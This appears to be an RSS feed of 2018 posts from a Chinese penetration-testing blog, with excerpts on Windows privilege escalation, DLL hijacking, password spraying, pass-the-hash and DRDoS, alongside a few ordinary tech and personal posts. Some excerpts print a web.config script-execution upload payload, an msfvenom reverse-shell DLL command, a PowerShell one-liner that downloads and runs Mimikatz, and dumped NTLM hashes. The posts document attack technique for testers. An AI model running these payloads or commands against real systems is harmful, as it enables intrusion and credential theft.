0x02 为什么谈到内网渗透技术，Linux相关的较少？ 其实这个和windows的认证有关系，例如Pass The Hash、伪造票据、令牌假冒等，但是linux的认证较为单一，均采用ssh管理，并使用非对称加密。但是Windows从work group到domain，使用lm、ntlm、kerberos，不断向后兼容的过程中，之前的协议缺陷越来越多，系统补丁都更新的很频繁。你要说它不好，其实要是做好加固，完全是可以不需要内外网之分的，无非就是地址的多少、资金问题。kerberos认证协议的问世，解决了在不安全的网络中进行双向认证、且不怕中间人攻击。域，对应一个域名，一个域名一个组织\企业，这都完全是可行的。总归来说，其实内网渗透它本身不算一个技术类别，而是考验你在不同的网络环境下，对操作系统、网络基础的理解能力。内网渗透不是一个技术类别，渗透测试也不是“测试网站”、“挖掘Web漏洞”，那叫Web应用安全测试。为什么会变成这样呢？是因为HTTP普及的太快了，发展的也很迅速，之前还在玩着xss，这又迅速普及了websocket……于是大家都把“系统”当作网站，把网站当作“系统”。直面现实的话，这不是不好，正是因为这样，安全行业才能够使得更多的人关注安全、让新鲜血液注入。
0x03 内网渗透需要掌握哪些东西？ 内网渗透只是现代攻防的一种表现，市场要比Web应用安全测试要小的多。但是你必须去掌握它，因为当木马、病毒来临时，你举手无措、你基础薄弱、你不能很快的发现问题，无法溯源、不知道木马如何落地。所以，攻防要持续学习，不管外网多么艰难，从外部进入内部的可能有很多，只是web的可能性更大。你需要掌握计算机操作系统基础知识、掌握一门或两门编程语言，必须保证一种是跨平台的、网络基础（路由、交换）、非常扎实的TCP/IP协议基础、不断持续研究的心。
就目前来看，我发现从乙方的一些服务中能够直接转换到甲方技能的就是应急响应了，那么应急的时候，你难道还说：“我不需要懂内网渗透吗？？？？” - 倾旋 2018-11-23</description></item><item><title>ASP.NET 文件上传黑名单解决办法</title><link>https://payloads.online/archivers/2018-11-04/1/</link><pubDate>Sun, 04 Nov 2018 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2018-11-04/1/</guid><description>ASP.NET 文件上传黑名单解决办法 来源：https://poc-server.com/blog/2018/05/22/rce-by-uploading-a-web-config/
同过上传web.config配置文件可以使得任意扩展名的文件以脚本代码运行
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt; &amp;lt;configuration&amp;gt; &amp;lt;system.webServer&amp;gt; &amp;lt;handlers accessPolicy=&amp;#34;Read, Script, Write&amp;#34;&amp;gt; &amp;lt;add name=&amp;#34;web_config&amp;#34; path=&amp;#34;*.jpa&amp;#34; verb=&amp;#34;*&amp;#34; modules=&amp;#34;IsapiModule&amp;#34; scriptProcessor=&amp;#34;%windir%\system32\inetsrv\asp.dll&amp;#34; resourceType=&amp;#34;Unspecified&amp;#34; requireAccess=&amp;#34;Write&amp;#34; preCondition=&amp;#34;bitness64&amp;#34; /&amp;gt; &amp;lt;/handlers&amp;gt; &amp;lt;security&amp;gt; &amp;lt;requestFiltering&amp;gt; &amp;lt;fileExtensions&amp;gt; &amp;lt;remove fileExtension=&amp;#34;.jpa&amp;#34; /&amp;gt; &amp;lt;/fileExtensions&amp;gt; &amp;lt;hiddenSegments&amp;gt; &amp;lt;remove segment=&amp;#34;web.config&amp;#34; /&amp;gt; &amp;lt;/hiddenSegments&amp;gt; &amp;lt;/requestFiltering&amp;gt; &amp;lt;/security&amp;gt; &amp;lt;/system.webServer&amp;gt; &amp;lt;appSettings&amp;gt; &amp;lt;/appSettings&amp;gt; &amp;lt;/configuration&amp;gt; 上传完成web.config到Web目录下后，可以再上传*.jpa的扩展名文件达到执行任意代码的目的。</description></item><item><title>解决Mac OS挂载NTFS格式硬盘无法读写</title><link>https://payloads.online/archivers/2018-10-30/1/</link><pubDate>Tue, 30 Oct 2018 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2018-10-30/1/</guid><description>查看分区 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 rvn0xsy@Rvn0xsy ~/&amp;gt; diskutil list /dev/disk0 (internal): #: TYPE NAME SIZE IDENTIFIER 0: GUID_partition_scheme 500.3 GB disk0 1: EFI EFI 314.6 MB disk0s1 2: Apple_APFS Container disk1 500.0 GB disk0s2 /dev/disk1 (synthesized): #: TYPE NAME SIZE IDENTIFIER 0: APFS Container Scheme - +500.0 GB disk1 Physical Store disk0s2 1: APFS Volume Macintosh HD 209.</description></item><item><title>xssValidator</title><link>https://payloads.online/archivers/2018-10-19/1/</link><pubDate>Fri, 19 Oct 2018 00:00:44 +0000</pubDate><guid>https://payloads.online/archivers/2018-10-19/1/</guid><description>0x00 前言 xss Validator是一个Burp商店的一个高分插件，该插件依赖于phantomjs项目以及Burp的Intruder模块。
0x01 安装 安装插件 打开Burp，点击“Extender”-&amp;gt;“BApp Store”-&amp;gt;&amp;ldquo;XSS Validator&amp;rdquo;-&amp;gt;“install”
安装phantomjs 下载页面：http://phantomjs.org/download.html
可根据自己的操作系统类型，选择对应的版本，我这里是Mac OSX
然后下载xss.js，将它放入phantomjs的执行目录。
0x02 测试之前的步骤 1 2 3 4 5 rvn0xsy@Rvn0xsy ~/G/p/bin&amp;gt; pwd /Users/rvn0xsy/GitProject/phantomjs-2.1.1-macosx/bin rvn0xsy@Rvn0xsy ~/G/p/bin&amp;gt; ls phantomjs xss.js rvn0xsy@Rvn0xsy ~/G/p/bin&amp;gt; ./phantomjs xss.js # 启动监听 这时回到Burp的xss Validator插件页面：
其中：
Grep Phrase是XSS执行成功后，能够解析出的字符串，支持自定义。 Javascript function是验证函数，会被解析的时候调用。 Javascript event handlers是监听事件。 Payloads是测试XSS的模板，必须包含{JAVASCRIPT}，否则无法判断状态 0x03 测试演示</description></item><item><title>COM Hijacking</title><link>https://payloads.online/archivers/2018-10-14/1/</link><pubDate>Sat, 13 Oct 2018 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2018-10-14/1/</guid><description>0x00 COM介绍 COM是Component Object Model （组件对象模型）的缩写。
COM是微软公司为了计算机工业的软件生产更加符合人类的行为方式开发的一种新的软件开发技术。在COM构架下，人们可以开发出各种各样的功能专一的组件，然后将它们按照需要组合起来，构成复杂的应用系统。
0x01 应用程序与COM注册表的关系 注册表 首先需要介绍一下注册表，注册表可以理解为一个树状结构的数据库，它具有一些特殊的数据类型用来存储一些数据满足应用程序的需要。
名称 作用 HKEY_CLASSES_ROOT 用于存储一些文档类型、类、类的关联属性。 HKEY_CURRENT_CONFIG 用户存储有关本地计算机系统的当前硬件配置文件信息。 HKEY_CURRENT_USER 用于存储当前用户配置项。 HKEY_CURRENT_USER_LOCAL_SETTINGS 用于存储当前用户对计算机的配置项。 HKEY_LOCAL_MACHINE 用于存储当前用户物理状态。 HKEY_USERS 用于存储新用户的默认配置项。 HKEY_CLASSES_ROOT = HKEY_LOCAL_MACHINE + HKEY_CURRENT_USER
CLSID 首先需要介绍一下CLSID(Class Identifier)，中文翻译为：“全局唯一标识符”。
CLSID是指Windows系统对于不同的应用程序，文件类型，OLE对象，特殊文件夹以及各种系统组件分配的一个唯一表示它的ID代码，用于对其身份的标识和与其他对象进行区分。
也就是说CLSID就是对象的身份证号，而当一个应用程序想要调用某个对象时，也是通过CLSID来寻找对象的。
按下Ctrl+R打开运行窗口，键入 ::{20D04FE0-3AEA-1069-A2D8-08002B30309D}即可打开“我的电脑”
回收站的CLISD是：::{645FF040-5081-101B-9F08-00AA002F954E}
CLSID是如何创建的 CLSID结构体：
1 2 3 4 5 6 7 8 typedef struct _GUID { DWORD Data1; // 随机数 WORD Data2; // 和时间相关 WORD Data3; // 和时间相关 BYTE Data4[8]; // 和网卡MAC相关 } GUID; typedef GUID CLSID; // 组件ID typedef GUID IID; // 接口ID 通过操作系统提供的结构体与API来创建CLSID，保障唯一性。</description></item><item><title>Windows 本地特权提升技巧</title><link>https://payloads.online/archivers/2018-10-08/1/</link><pubDate>Mon, 08 Oct 2018 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2018-10-08/1/</guid><description>0x00 前言 本文主要有以下章节：
1.服务路径权限可控提权 2.模糊路径提权 3.定时任务计划提权 4.MSI安装策略提权 5.DLL劫持提权 6.信息搜集 许多事只有做了才知道。 - Rvn0xsy（倾旋）
写于 2018/9/17
0x01 服务路径权限可控 通常情况下，一些Web控件、网络客户端会在本地注册一些服务，这些服务在开机自启动，而自启动的权限又是SYSTEM。
在软件注册服务的时候，会在注册表中创建几个项，该项的注册表路径如下：
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services
我选择一个名为“gwservice”的项，查看该项下的所有值：
其中有一个ImagePath的名称，它的值是：
C:\Program Files (x86)\Gateway\SSLVPN\gwservice.exe
可见它是一个VPN相关的服务，下面有两种提权可能：
1.若这个注册表的修改权限当前用户可控，那就可以直接修改ImagePath的值，指向到本地其他路径，获得这个服务的权限。 2.若这个ImagePath所指向的目录权限可控，那么我们也可以替换gwservice.exe，从而当服务启动的时候，就能够执行我们的应用程序（木马）。 但是很遗憾，第1种不行：
当前用户没有足够的权限。
尝试第二种方法，使用“icacls”命令查看目录权限：
惊喜的发现，“Everyone”用户可以读写该目录下所有文件。
Ps:Everyone代指当前主机下所有用户，包含（Guest）
提权过程 首先，我启用了win7的Guest用户，使用Guest用户登录这台机器：
Ping命令都不让用，限制很死。
使用msf生成一个木马：
将木马替换为gwservice.exe
先执行测试一下，能否获得Guest的session：
获得会话后，注销（或重启）Guest用户，登录管理员用户，获得SYSTEM权限：
提权情况还是要根据服务器本身的环境，我总结的这些方法就是为了优先采用这些方式，而不是直接突突搞EXP ……
0x02 模糊路径提权 在上一篇中，我们继续基于Gateway Session Service这个服务进行分析其他提权方法：
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services
其中有一个ImagePath的名称，它的值是：
C:\Program Files (x86)\Gateway\SSLVPN\gwservice.exe
当服务启动时，将会读取这个ImagePath的值，我们无法更改这个值，但是可以通过Windows的特性来巧妙提权。 注意：当前这个环境只是演示，排除目录权限的原因是100%成功的。
重点：当ImagePath的值不是一个绝对路径时，我们可以通过Windows API中的“CreateProcessA”函数的特性，将木马放置在带有空格目录的同级目录下，当服务启动时，会首先在空格目录当前目录搜索第一个单词的二进制文件。
例子：
C:\Program Files (x86)\server process\ssl\service.exe
如果不是绝对路径，寻找过程如下：
C:\Program.exe C:\Program Files (x86)\server.exe C:\Program Files (x86)\server process\ssl\service.exe 参考链接： https://docs.</description></item><item><title>Python virtualenv</title><link>https://payloads.online/archivers/2018-08-16/1/</link><pubDate>Thu, 16 Aug 2018 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2018-08-16/1/</guid><description>0x00 virtualenv 简介 virtualenv 用来建立一个虚拟的python环境，为了解决Python各种库的冲突问题。
0x01 virtualenv 安装 通用安装方法 1 pip install virtualenv Ubuntu/Kali/Debian 1 2 apt-get upgrade &amp;amp;&amp;amp; apt-get update apt-get install virtualenv 0x02 virtualenv 使用 帮助信息 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 ~$ virtualenv -h Usage: virtualenv [OPTIONS] DEST_DIR Options: --version 显示程序的版本号并退出 -h, --help 显示程序的帮助信息并退出 -v, --verbose 增强输出 -q, --quiet 减少输出 -p PYTHON_EXE, --python=PYTHON_EXE Python的可执行路径(/usr/bin/python) --clear 清除安装的库 --no-site-packages 给出一个干净的环境，不包含系统已安装的库 --system-site-packages 包含系统库 --always-copy 始终复制文件而不是符号链接。 --relocatable 使一个现有的virtualenv环境这会修复脚本并生成所有.</description></item><item><title>Microsoft DirectX SDK June 2010 Xact3.exe DLL Hijacking复现</title><link>https://payloads.online/archivers/2018-08-15/1/</link><pubDate>Wed, 15 Aug 2018 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2018-08-15/1/</guid><description>0x00 前言 Microsoft DirectX SDK (June 2010) Xact3.exe https://www.microsoft.com/en-us/download/details.aspx?id=6812
目前微软官方已经废弃该SDK，所以我只能本着学习的心态去复现。
通过参考网上的漏洞披露，我决定复现一下。 这个和之前QQ拼音输入法6.0最新版DLL劫持 - 可利用于提权的思路差不多。
0x01 复现过程 首先，漏洞披露详情如下：
1 2 3 4 5 6 7 Exploit/POC ============= 1) create DLL 32bit DLL named &amp;#34;xbdm.dll&amp;#34; and place on a remote share 2) create an empty file with a &amp;#34;.xap&amp;#34; extension on the same share, this will open using &amp;#34;Xact3.exe&amp;#34; as its default 3) open the the .xap file from the Network share then BOOM!</description></item><item><title>近期的生活</title><link>https://payloads.online/archivers/2018-08-03/2/</link><pubDate>Fri, 03 Aug 2018 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2018-08-03/2/</guid><description>0x01 入职 在炎热的四月底，我背着双肩包，顶着一头乱发来到上海，傍晚下了高铁，想到公司附近转转，赶上了团队的技术分享，晚上喝了很多酒，印象最深的还是那烧烤、啤酒、热情的人。
0x02 工作 慢慢的接触到了很多大牛，都很低调，从开始的渗透测试转向新型安全服务，偏向产品的路线，在接触产品的过程中也学到了不少；
有应急响应、代码审计、流量分析、渗透测试等，技术的广度提升了很多，也看到了技术变现有更多的可能，唯一就是我要不断的创新、发散自己的思维。
0x03 近况 最近没有规划近期目标，让我觉得有点小焦虑，很多东西都可以一步一步来的，准备养成一个写日记的习惯。
0x04 收获 在日常和同事聊起安服的时候，都能感受到一个好的安全服务工程师应该有的素养，首先就是要符合企业价值观，稳步成长。
在和客户接触的时候，不管是售前阶段、售后阶段，都要具备良好的表达沟通能力，大企、小司你要清楚各种客户他最根本的需要，接触的多了你的解决方案才会更容易落地、更容易被认可。
“引导客户需求” 每个人都有短处，将自己的长处发挥到极致是最好的状态，这块谈的不是销售技巧，而是个人营销的技巧，在现场、电话中，要清楚的知道自己的定位，“我是一个安全服务工程师，我的职责就是给予客户的问题技术层面的解决方案。”</description></item><item><title>Nmap扩展开发（一）</title><link>https://payloads.online/archivers/2018-07-27/1/</link><pubDate>Fri, 27 Jul 2018 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2018-07-27/1/</guid><description>0x01 前言 本来是想写成一本书的，但是可能断断续续没有很好的产出，我只能以文章的形式分享出来了，希望我的研究成果能够给大家带来便利。—— 作者：倾旋
PS ：如果你不知道你是否需要学习这个技术，那么我可以先告诉你Nmap能够做什么：
网络结构画像 漏洞扫描 漏洞利用 端口扫描 爬虫 信息搜集 &amp;hellip;. 我的分类不是很清晰，但是对于一个渗透测试人员、运维人员、甲、乙方的工程师都会需要它的定制化功能，例如：将扫描结果写到数据库？新的漏洞出了POC，客户需要立即进行漏洞扫描？
导出扫描结果这个问题，Nmap官方做出如下回应：
Nmap Network Scanning
一个共同的愿望是将Nmap结果输出到数据库以便于查询和跟踪。这允许用户来自个人渗透测试仪 到国际企业存储他们的所有扫描结果并轻松比较它们。企业可能每天运行大型扫描，并为新打开的端口或可用计算机的邮件管理员安排查询。渗透测试人员可能会了解新漏洞并搜索受影响应用程序的所有旧扫描结果，以便他可以警告相关客户端。研究人员可以扫描数百万个IP地址，并将结果保存在数据库中，以便进行实时查询。
虽然这些目标值得称赞，但Nmap不提供直接的数据库输出功能。我不仅有太多不同的数据库类型支持它们，而且用户的需求变化如此之大，以至于没有单一的数据库模式是合适的。企业，笔测试员和研究人员的需求都需要不同的表结构。
而很多朋友大多都是使用Python来调用Nmap进行格式解析，这种方式无法预估扫描进度，不能进行状态交互，效率很差，如果我们需要一个实时进行独写、漏洞检测等定制化的操作，那么就可以跟我一起来学习如何写一个自己的Nmap脚本，这本书涵盖的知识比较多，会涉及安全、网络协议、编程技术这些相关知识，相信你能够收获很多。
笔者写扩展脚本开发系列的初衷是让大家了解nmap这个优秀的开源工具的功能，解决一些定制化的扫描需求。
在开始之前，需要读者具备：能够熟练使用Nmap进行端口扫描、了解Nmap目录结构、懂得常见的网络知识、Lua基础（如果需要的话，我会在后期铺垫）。
请将你的读后感或建议留言评论，不胜荣幸！
0x02 Nmap扩展脚本分类 auth	处理身份验证 broadcast 网络广播 brute	暴力猜解 default	默认 discovery	服务发现 dos	拒绝服务 exploit	漏洞利用 external	外部扩展 fuzzer	模糊测试 intrusive	扫描可能造成不良后果 malware	检测后门 safe	扫描危害较小 version	版本识别 vuln 漏洞检测 0X03 Nmap扩展脚本铺垫 相信网上已经有很多文章去写如何使用扩展脚本了，这块我不准备过多的铺垫。
主要介绍如下几点：
Nmap扩展脚本用途 Nmap扩展脚本使用方法 如何查看Nmap扩展脚本的Usage（使用方法） 0X03 [1] Nmap扩展脚本用途&amp;gt; Nmap扩展脚本能够帮助我们实现更多定制化的需求扫描、结果的处理、漏洞的检测、漏洞的利用等。在0x02中已经列出了扩展脚本的分类，根据说明我们能理解一个大概，这些分类代表了Nmap各个方面的能力。
0x03 [2] Nmap扩展脚本使用方法 在很早之前，我写过一篇科普文章，主要介绍了Nmap的脚本分类、使用方法，链接：http://zhuanlan.zhihu.com/p/26618074</description></item><item><title>QQ拼音输入法6.0最新版DLL劫持 - 可利用于提权</title><link>https://payloads.online/archivers/2018-06-09/1/</link><pubDate>Sat, 09 Jun 2018 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2018-06-09/1/</guid><description>0x00 DLL劫持简介 《DLL劫持》技术当一个可执行文件运行时，Windows加载器将可执行模块映射到进程的地址空间中，加载器分析可执行模块的输入表，并设法找出任何需要的DLL，并将它们映射到进程的地址空间中。 &amp;ndash; 百度百科
0x01 应用程序寻找DLL的过程 1.程序所在目录 2.系统目录即 SYSTEM32 目录 3.16位系统目录即 SYSTEM 目录 4.Windows目录 5.加载 DLL 时所在的当前目录 6.PATH环境变量中列出的目录 首先如果在程序所在目录下未寻找到DLL，一般会在SYSTEM32目录下寻找到，那么可能会存在DLL劫持，要看注册表
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs
Windows操作系统通过“DLL路径搜索目录顺序”和“KnownDLLs注册表项”的机制来确定应用程序所要调用的DLL的路径，之后，应用程序就将DLL载入了自己的内存空间，执行相应的函数功能。
0x02 寻找过程 Process Monitor一款系统进程监视软件，总体来说，Process Monitor相当于Filemon+Regmon，其中的Filemon专门用来监视系统 中的任何文件操作过程，而Regmon用来监视注册表的读写操作过程。 有了Process Monitor，使用者就可以对系统中的任何文件和 注册表操作同时进行监视和记录，通过注册表和文件读写的变化， 对于帮助诊断系统故障或是发现恶意软件、病毒或木马来说，非常 有用。 这是一个高级的 Windows 系统和应用程序监视工具，由优秀的 Sysinternals 开发，并且目前已并入微软旗下，可靠性自不用说。
通过Process Monitor找出一些可能容易被劫持的DLL，特征一般如下：
ntmarta.dll(直接调用) profapi.dll（需要点击“配置”） 这两个都不在KnownDLLs中，由于开发人员调用这两个DLL的时候没有定义绝对路径，导致DLL搜索，我们可以直接在搜索到system32之前，放入我们要劫持的DLL。
权限问题：
如果要劫持的DLL目录被操作系统限制了必须以管理员权限才可以读写，那么我们无法利用，本文演示从低权限到高权限的DLL劫持提权。
那么这个漏洞刚刚好也符合我们的案例：C:\Program Files (x86)\Tencent\QQPinyin\6.0.5005.400
这个目录是任何人都可以读写的，使用MSF生成DLL：
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.211.55.19 LPORT=4478 -f dll &amp;gt; ntmarta.dll
接下来通过任意途径，将dll copy到C:\Program Files (x86)\Tencent\QQPinyin\6.0.5005.400路径下即可
MSF配置如下：
当用户使用输入法的时候、或者重启PC的时候，或者切换输入法的时候，都将会触发，我们可以获得一个Meterpreter会话。
0x03 视频演示</description></item><item><title>Windows域渗透 - 用户密码枚举</title><link>https://payloads.online/archivers/2018-05-02/1/</link><pubDate>Wed, 02 May 2018 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2018-05-02/1/</guid><description>0x00 前言 在进行Windows域渗透的时候，面对庞大的用户账号，不知该从何下手，扫描网络服务有怕搞出大动静，肿么办呢？
0x01 Powershell 目前已经有很多Powershell集合脚本，用于域渗透简直舒爽
今天推荐一款名字叫DomainPasswordSpray.ps1的脚本，主要原理是先来抓取域用户账号，然后指定密码字典进行域认证。认证通过的就是密码正确的了。
GitHub项目地址：https://github.com/dafthack/DomainPasswordSpray
由于作者的脚本有一个小瑕疵，故此我改了一下，避免抛出了一些错误。
优化后的地址：http://payloads.online/scripts/Invoke-DomainPasswordSpray.txt
0x02 参数说明 在代码的开头就已经有介绍了，我简单汉化一下。
描述：该模块主要用于从域中收集用户列表。
参数： Domain 指定要测试的域名 参数： RemoveDisabled 尝试从用户列表删除禁用的账户 参数： RemovePotentialLockouts 删除锁定账户 参数： UserList 自定义用户列表(字典)。 如果未指定，这将自动从域中获取 参数： Password 指定单个密码进行口令测试 参数： PasswordList 指定一个密码字典 参数： OutFile 将结果保存到某个文件 参数： Force 当枚举出第一个后继续枚举，不询问 0x03 使用说明 使用例子：
C:\PS&amp;gt; Get-DomainUserList
该命令将从域中收集用户列表。
C:\PS&amp;gt; Get-DomainUserList -Domain 域名 -RemoveDisabled -RemovePotentialLockouts | Out-File -Encoding ascii userlist.txt
该命令将收集域“域名”中的用户列表，包括任何未被禁用且未接近锁定状态的帐户。 它会将结果写入“userlist.txt”文件中
C:\PS&amp;gt; Invoke-DomainPasswordSpray -Password Winter2016
该命令将会从域环境中获取用户名，然后逐个以密码Winter2016进行认证枚举
C:\PS&amp;gt; Invoke-DomainPasswordSpray -UserList users.txt -Domain 域名 -PasswordList passlist.</description></item><item><title>新生活 - 上海，我来了</title><link>https://payloads.online/archivers/2018-04-20/1/</link><pubDate>Fri, 20 Apr 2018 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2018-04-20/1/</guid><description>完成了一个梦想，真好，转眼间逝去的两年，我不断成长，感受人情冷暖、接纳新鲜事物，至今已学会如何照顾自己，让生活更具有色彩，人生更加无憾。
谢谢我的朋友们给我的支持！</description></item><item><title>使用CrackMapExec 进行 NTLM Hash传递攻击</title><link>https://payloads.online/archivers/2018-03-27/1/</link><pubDate>Tue, 27 Mar 2018 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2018-03-27/1/</guid><description>0x01 前言 早期SMB协议在网络上传输明文口令。后来出现 LAN Manager Challenge/Response 验证机制，简称LM，它是如此简单以至很容易就被破解。微软提出了WindowsNT挑战/响应验证机制，称之为NTLM。
从Win2000开始默认协议为Kerboros，下列情况会调用NTLM：
遗留客户端或服务器需要登录到网络或本地时。 UNIX客户端需要与NT服务器通话时。 有正在使用验证NTLM的服务器信息块（SMB）后台程序的UNIX客户端时。 也即认证方或被认证方有仅支持NTLM情况时。 它以挑战/响应（Challenge/Response）顺序为基础。
1.客户端发送用户名和域名到服务器。 2.服务器转发到域控制器DC。 3.DC用客户端密码随机产生一个8字节得挑战（Challenge），发送给服务器。 4.服务器将挑战转发给客户端。 5.客户端用密码经过hash及DES加密算法等操作得到一个加密结果响应（Response）发送给服务器。 6.服务器将响应转发给DC。 7.DC做同样操作验证客户端响应。 8.验证结束，返回结果通知服务器。 0x02 NTLM对渗透的作用 NTLM就好像是一个令牌，有了这个令牌就相当于获取了这个令牌所属者的权限。
最大的特点就是我们可以使用SMB执行Command。
0x03 CrackMapExec 介绍 CrackMapExec提供了域环境（活动目录）渗透测试中一站式便携工具，它具有列举登录用户、通过SMB(Server Message Block)网络文件共享协议爬虫列出SMB分享列表，执行类似于Psexec的攻击、使用powerShell脚本执行自动式Mimikatz/Shellcode/DLL注入到内存中，dump NTDS.dit密码。
WiKi:https://github.com/byt3bl33d3r/CrackMapExec/wiki
0x03 安装CrackMapExec Kali Linux apt-get install crackmapexec
Debian/Ubuntu 1 2 apt-get install -y libssl-dev libffi-dev python-dev build-essential pip install crackmapexec 0x04 传递NTLM Hash执行命令 使用Mimikatz获取NTLM Hash 1 2 3 4 PS C:\Users\administrator\Documents&amp;gt;IEX(New-Object Net.WebClient).DownloadString(&amp;#39;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&amp;#39;) PS C:\Users\administrator\Documents&amp;gt;Invoke-Mimikatz 获取NTLM Hash
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 **** msv : [00000003] Primary * Username : Administrator * Domain : PAYLOADS * LM : 5609e3f4c7c56d5fa86fb73c70515bd7 * NTLM : dab7de8feeb5ecac65faf9fdc6cac3a9 * SHA1 : 67302089bba4993f2f845e5992db0a21e64679fa tspkg : * Username : Administrator * Domain : PAYLOADS * Password : **** wdigest : * Username : Administrator * Domain : PAYLOADS * Password : **** kerberos : * Username : Administrator * Domain : PAYLOADS.</description></item><item><title>浅谈使用C语言开发服务端漏洞扫描设计</title><link>https://payloads.online/archivers/2018-03-20/1/</link><pubDate>Tue, 20 Mar 2018 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2018-03-20/1/</guid><description>0x00 前言 都是自己闷头搞出来的经验，对于自己是经验，对大家就不知道合不合口味了。
本文可能过多的穿插以下知识点：
套接字 协议选择 服务端模型 信号处理 多进程、多线程 任务派发过程 能尽量图示就图示了。顺便总结一下自己网络编程的经验。 :D
0x01 网络套接字(SOCKET) 什么是套接字 在我的理解中，网络套接字是一个被封装在传输层与应用层之间的API接口。
0x01 每一个方法都被操作系统支持，我们只需要知道创建套接字的流程以及网络基本知识就可以进行套接字的编程了。
许多的远程利用攻击、漏洞验证工具都离不开套接字，没有套接字就没有现在能够进行“进程”与“进程”之间通信的过程实现。
下面引用百科的解释：
TCP用主机的IP地址加上主机上的端口号作为TCP连接的端点，这种端点就叫做套接字（socket）或插口。
套接字用（IP地址：端口号）表示。
它是网络通信过程中端点的抽象表示，包含进行网络通信必需的五种信息：连接使用的协议，本地主机的IP地址，本地进程的协议端口，远地主机的IP地址，远地进程的协议端口。
听起来还是非常模糊、太抽象了！
那么我们来看看它到底是什么？
套接字的地址结构 刚才百科告诉我们，套接字用（IP地址：端口号）表示。
那么在网络编程中如何告诉计算机，什么是端口，什么是端口号呢？
于是出现了被计算机界公认的结构体，这个结构体保存在系统的标准库中：
1 2 3 4 5 6 7 8 9 10 11 12 13 14 #include &amp;lt;arpa/inet.h&amp;gt; struct sockaddr_in { __SOCKADDR_COMMON (sin_); in_port_t sin_port;	/* Port number. */ struct in_addr sin_addr;	/* Internet address. */ /* Pad to size of `struct sockaddr&amp;#39;. */ unsigned char sin_zero[sizeof (struct sockaddr) - __SOCKADDR_COMMON_SIZE - sizeof (in_port_t) - sizeof (struct in_addr)]; }; 看起来还是比较复杂的，但是用起来一点都不复杂。</description></item><item><title>渗透测试中使用Ubuntu的一些小技巧</title><link>https://payloads.online/archivers/2018-03-18/1/</link><pubDate>Sun, 18 Mar 2018 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2018-03-18/1/</guid><description>0x00 前言 由于学习C、C++我喜欢在Linux平台，首选了Ubuntu这个发新版，目前已经做得很不错了，但是平常使用的时候会发现一些比较麻烦的事情。
本文就把一些技巧分享、记录下来。
操作系统版本：Ubuntu 17.10
我的源：
1 2 3 4 5 6 7 8 9 deb http://cn.archive.ubuntu.com/ubuntu/ artful universe deb http://cn.archive.ubuntu.com/ubuntu/ artful-updates universe deb http://cn.archive.ubuntu.com/ubuntu/ artful multiverse deb http://cn.archive.ubuntu.com/ubuntu/ artful-updates multiverse deb http://cn.archive.ubuntu.com/ubuntu/ artful-backports main restricted universe multiverse deb http://security.ubuntu.com/ubuntu artful-security main restricted deb http://security.ubuntu.com/ubuntu artful-security universe deb http://security.ubuntu.com/ubuntu artful-security multiverse 0x01 右键 nautilus-actions 是一个提供用户自定义鼠标右键菜单的软件。
我们可以通过nautilus-actions-config-tool 来配置自己想要的菜单
安装方式很简单：sudo apt-get install nautilus-actions
在命令行中启动nautilus-actions-config-tool就可以打开配置页面
0x01 可以看到我已经自己添加了两个菜单，主要用于Nmap从文本中读取目标进行扫描
Ubuntu默认情况下是没有新建文本这个菜单的，我们自己通过这个工具添加一下试试：
0x02 配置一下命令：
0x03 这里有几个变量介绍一下：</description></item><item><title>华为RIP协议</title><link>https://payloads.online/archivers/2015-11-20/2/</link><pubDate>Fri, 16 Mar 2018 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2015-11-20/2/</guid><description>&lt;p>本文记录一下华为RIP协议的简单配置&lt;/p></description></item><item><title>使用C语言发送伪造源IP的UDP请求及DRDOS拒绝服务攻击原理剖析</title><link>https://payloads.online/archivers/2018-03-04/1/</link><pubDate>Sun, 04 Mar 2018 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2018-03-04/1/</guid><description>0x01 什么是DRDOS DRDoS是英文“Distributed Reflection Denial of Service ”的缩写，中文意思是“分布式反射拒绝服务”。与DoS、DDoS不同，该方式靠的是发送大量带有被害者IP地址的数据包给攻击主机，然后攻击主机对IP地址源做出大量回应，形成拒绝服务攻击。
0x02 DRDOS的攻击流程 DRDoS要完成一次反射放大攻击：
1 攻击者，必须提前需要把攻击数据存放在所有的在线肉鸡或者反射服务器之上。 2 攻击者，必须伪造IP源头。发送海量伪造IP来源的请求。当然这里的IP就是受害者的IP地址。 3 反射服务器，必须可以反射数据，运行良好稳定。最好是请求数据少，返回数据成万倍增加。 0x03 DRDOS的特性 （如果没有理解UDP协议，请不要向下继续阅读……会越来越混乱）
根据上述概念可以理解为，DRDOS需要一个能够伪造IP头的协议，这个协议最突出的就是UDP协议了。
使用基于 TCP 协议的通信不可以对源 IP 地址进行伪造 使用基于 UDP 协议的通信可以对源 IP 地址进行伪造 TCP 不能伪造源 IP 地址是因为 TCP 协议中的三次握手的存在，如果源 IP 地址被修改，那么三次握手将无法达成。
